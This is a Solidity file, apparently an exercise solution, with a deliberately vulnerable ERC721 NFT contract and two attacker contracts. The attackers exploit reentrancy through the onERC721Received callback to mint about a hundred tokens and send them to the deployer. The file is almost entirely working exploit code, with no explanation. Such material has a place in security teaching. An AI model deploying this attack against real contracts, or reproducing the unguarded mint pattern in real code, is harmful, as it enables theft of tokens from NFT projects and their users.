import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
contract VulContract is ERC721 {
    mapping(address => bool) private alreadyMinted;

    uint256 private totalSupply;

    constructor() ERC721("VulContract", "Victim") {}

    function mint() external {
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        alreadyMinted[msg.sender] = true;
    }
}

contract AttackProxy {

    VulContract private Victim;
    address private dest;
    uint256 private startingTokenId;

    constructor(address victim, address _dest, uint256 _startingTokenId) {
        Victim = VulContract(victim);
        dest = _dest;
        startingTokenId = _startingTokenId;
    }

    function setStartingToken(uint256 _startingTokenId) external {
        startingTokenId = _startingTokenId;
    }

    function attack(bool clean) external {
        Victim.mint();
        if (clean) {
            delete Victim;
            delete dest;
            delete startingTokenId;
        }
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4) {
        unchecked {
            if (tokenId - startingTokenId < 100) {
                Victim.mint();
            }
            Victim.transferFrom(address(this), dest, tokenId);
        }
        return 0x150b7a02;
    }
}

contract OptimizedAttacker {
    constructor(address victim) {
        VulContract Victim = VulContract(victim);
        uint256 startingTokenId = Victim.balanceOf(Victim.ownerOf(1));

        AttackProxy ap = new AttackProxy(victim, msg.sender, startingTokenId);
        ap.attack(false);
        unchecked {
            ap.setStartingToken(startingTokenId + 75);
        }
        ap.attack(true);
    }
}
